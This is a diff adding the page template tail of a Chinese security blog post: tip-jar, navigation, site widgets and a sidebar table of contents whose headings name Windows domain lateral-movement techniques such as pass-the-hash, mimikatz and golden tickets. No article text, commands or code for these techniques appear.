+
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div>原创技术分享，您的支持将鼓励我继续创作</div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/wechatpay.jpg" alt="Spring 微信支付">
+        <p>微信支付</p>
+      </div>
+      
+      <div style="display: inline-block;">
+        <img src="/images/alipay.jpg" alt="Spring 支付宝">
+        <p>支付宝</p>
+      </div>
+
+  </div>
+</div>
+
+        
+
+  <div class="followme">
+    <p>欢迎关注我的其它发布渠道</p>
+
+    <div class="social-list">
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/images/wechat_channel.jpg">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </a>
+        </div>
+    </div>
+  </div>
+
+
+	  
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91/" rel="tag"># 域内横向</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/02/17/%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93/" rel="prev" title="隐藏通信隧道">
+      <i class="fa fa-chevron-left"></i> 隐藏通信隧道
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2022/03/01/%E5%B8%B8%E8%A7%81webshell%E5%AE%A2%E6%88%B7%E7%AB%AF%E7%9A%84%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81%E5%8F%8A%E6%A3%80%E6%B5%8B%E6%80%9D%E8%B7%AF/" rel="next" title="常见webshell客户端的流量特征及检测思路">
+      常见webshell客户端的流量特征及检测思路 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%9F%9F%E6%A8%AA%E5%90%91%E6%89%B9%E9%87%8Fat-amp-schtasks-amp-impacket"><span class="nav-number">1.</span> <span class="nav-text">域横向批量at&amp;schtasks&amp;impacket</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E6%98%8E%E6%96%87%E4%BC%A0%E9%80%92-at-amp-schtasks"><span class="nav-number">1.1.</span> <span class="nav-text">横向渗透明文传递 at&amp;schtasks</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E6%98%8E%E6%96%87HASH%E4%BC%A0%E9%80%92atexec-impacket"><span class="nav-number">1.2.</span> <span class="nav-text">横向渗透明文HASH传递atexec-impacket</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E6%98%8E%E6%96%87HASH%E4%BC%A0%E9%80%92%E6%89%B9%E9%87%8F%E5%88%A9%E7%94%A8-%E7%BB%BC%E5%90%88"><span class="nav-number">1.3.</span> <span class="nav-text">横向渗透明文HASH传递批量利用-综合</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E6%98%8E%E6%96%87HASH%E4%BC%A0%E9%80%92%E6%89%B9%E9%87%8F%E5%88%A9%E7%94%A8-%E5%8D%87%E7%BA%A7%E7%89%88"><span class="nav-number">1.4.</span> <span class="nav-text">横向渗透明文HASH传递批量利用-升级版</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%9F%9F%E6%A8%AA%E5%90%91smb-amp-wmi%E6%98%8E%E6%96%87%E6%88%96hash%E4%BC%A0%E9%80%92"><span class="nav-number">2.</span> <span class="nav-text">域横向smb&amp;wmi明文或hash传递</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85"><span class="nav-number">2.1.</span> <span class="nav-text">知识补充</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Procdump-Mimikatz%E9%85%8D%E5%90%88%E8%8E%B7%E5%8F%96"><span class="nav-number">2.2.</span> <span class="nav-text">Procdump+Mimikatz配合获取</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Hashcat%E7%A0%B4%E8%A7%A3%E8%8E%B7%E5%8F%96windows-NTML-Hash"><span class="nav-number">2.3.</span> <span class="nav-text">Hashcat破解获取windows NTML Hash</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%9F%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8SMB%E6%9C%8D%E5%8A%A1%E5%88%A9%E7%94%A8-psexec-smbexec-%E5%AE%98%E6%96%B9%E8%87%AA%E5%B8%A6"><span class="nav-number">2.4.</span> <span class="nav-text">域横向移动SMB服务利用-psexec,smbexec(官方自带)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%9F%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8WMI%E6%9C%8D%E5%8A%A1%E5%88%A9%E7%94%A8-cscript-wmiexec-wmic"><span class="nav-number">2.5.</span> <span class="nav-text">域横向移动WMI服务利用-cscript,wmiexec,wmic</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%9F%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E4%BB%A5%E4%B8%8A%E6%9C%8D%E5%8A%A1hash-%E6%89%B9%E9%87%8F%E5%88%A9%E7%94%A8-python-%E7%BC%96%E8%AF%91exe"><span class="nav-number">2.6.</span> <span class="nav-text">域横向移动以上服务hash 批量利用-python 编译exe</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%9F%9F%E6%A8%AA%E5%90%91PTH-amp-PTK-amp-PTT%E5%93%88%E5%B8%8C%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92"><span class="nav-number">3.</span> <span class="nav-text">域横向PTH&amp;PTK&amp;PTT哈希票据传递</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%9F%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8PTH%E4%BC%A0%E9%80%92-mimikatz"><span class="nav-number">3.1.</span> <span class="nav-text">域横向移动PTH传递-mimikatz</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%9F%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8PTK%E4%BC%A0%E9%80%92-mimikatz"><span class="nav-number">3.2.</span> <span class="nav-text">域横向移动PTK传递-mimikatz</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%9F%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8PTT%E4%BC%A0%E9%80%92-ms14068-amp-kekeo-amp-%E6%9C%AC%E5%9C%B0"><span class="nav-number">3.3.</span> <span class="nav-text">域横向移动PTT传递-ms14068 &amp;kekeo&amp;本地</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%9F%9F%E6%A8%AA%E5%90%91-SPN-amp-RDP"><span class="nav-number">4.</span> <span class="nav-text">域横向 SPN&amp;RDP</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%9F%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8RDP%E4%BC%A0%E9%80%92-Mimikatz"><span class="nav-number">4.1.</span> <span class="nav-text">域横向移动RDP传递-Mimikatz</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%9F%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8SPN%E6%9C%8D%E5%8A%A1-%E6%8E%A2%E9%92%88-%E8%AF%B7%E6%B1%82-%E7%A0%B4%E8%A7%A3-%E9%87%8D%E5%86%99"><span class="nav-number">4.2.</span> <span class="nav-text">域横向移动SPN服务-探针,请求,破解,重写</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%9F%9F%E6%A8%AA%E5%90%91%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8Socks%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF"><span class="nav-number">5.</span> <span class="nav-text">域横向内网漫游Socks代理隧道技术</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8FNgrok%E6%B5%8B%E8%AF%95%E6%BC%94%E7%A4%BA-%E4%B8%A4%E4%B8%AA%E5%86%85%E7%BD%91%E9%80%9A%E8%AE%AF%E4%B8%8A%E7%BA%BF"><span class="nav-number">5.1.</span> <span class="nav-text">内网穿透Ngrok测试演示-两个内网通讯上线</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8FFrp%E8%87%AA%E5%BB%BA%E8%B7%B3%E6%9D%BF%E6%B5%8B%E8%AF%95-%E4%B8%A4%E4%B8%AA%E5%86%85%E7%BD%91%E9%80%9A%E8%AE%AF%E4%B8%8A%E7%BA%BF"><span class="nav-number">5.2.</span> <span class="nav-text">内网穿透Frp自建跳板测试-两个内网通讯上线</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%9F%9F%E6%A8%AA%E5%90%91CS-amp-MSF-%E8%81%94%E5%8A%A8%E5%8F%8A%E5%BA%94%E6%80%A5%E5%93%8D%E5%88%9D%E8%AF%86"><span class="nav-number">6.</span> <span class="nav-text">域横向CS&amp;MSF 联动及应急响初识</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#MSF-amp-CobaltStrike%E8%81%94%E5%8A%A8Shell"><span class="nav-number">6.1.</span> <span class="nav-text">MSF&amp;CobaltStrike联动Shell</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">7.</span> <span class="nav-text">总结</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-IPC%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="nav-number">7.1.</span> <span class="nav-text">1.IPC横向移动</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="nav-number">7.2.</span> <span class="nav-text">2.计划任务横向移动</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-Windows%E7%B3%BB%E7%BB%9F%E6%95%A3%E5%88%97%E5%80%BC%E8%8E%B7%E5%8F%96%E5%88%86%E6%9E%90"><span class="nav-number">7.3.</span> <span class="nav-text">3.Windows系统散列值获取分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-Mimikatz%E6%9E%9A%E4%B8%BENTLM-hash"><span class="nav-number">7.4.</span> <span class="nav-text">4.Mimikatz枚举NTLM hash</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%9A%E8%BF%87SAM%E5%92%8CSystem%E6%96%87%E4%BB%B6%E6%8A%93%E5%8F%96%E5%AF%86%E7%A0%81"><span class="nav-number">7.4.1.</span> <span class="nav-text">通过SAM和System文件抓取密码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%9A%E8%BF%87%E8%AF%BB%E5%8F%96SAM%E5%92%8CSystem%E6%96%87%E4%BB%B6%E8%8E%B7%E5%8F%96NTML-Hash"><span class="nav-number">7.4.2.</span> <span class="nav-text">通过读取SAM和System文件获取NTML Hash</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Mimikatz%E8%AF%BB%E5%8F%96SAM"><span class="nav-number">7.4.3.</span> <span class="nav-text">Mimikatz读取SAM</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-mimikatz%E5%85%8D%E6%9D%80%E6%96%B9%E6%B3%95"><span class="nav-number">7.5.</span> <span class="nav-text">5.mimikatz免杀方法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6-%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%88%A9%E7%94%A8"><span class="nav-number">7.6.</span> <span class="nav-text">6.黄金票据利用</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Spring"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">Spring</p>
+  <div class="site-description" itemprop="description">见到一座山，就想知道山后面是什么。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">14</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">14</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/yourname" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;yourname" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://blog.csdn.net/qq_49502930" title="CSDN → https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_49502930" rel="noopener" target="_blank"><i class="crosshairs fa-fw"></i>CSDN</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Spring</span>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":"true#是否在手机端显示"},"log":false});</script></body>
+</html>
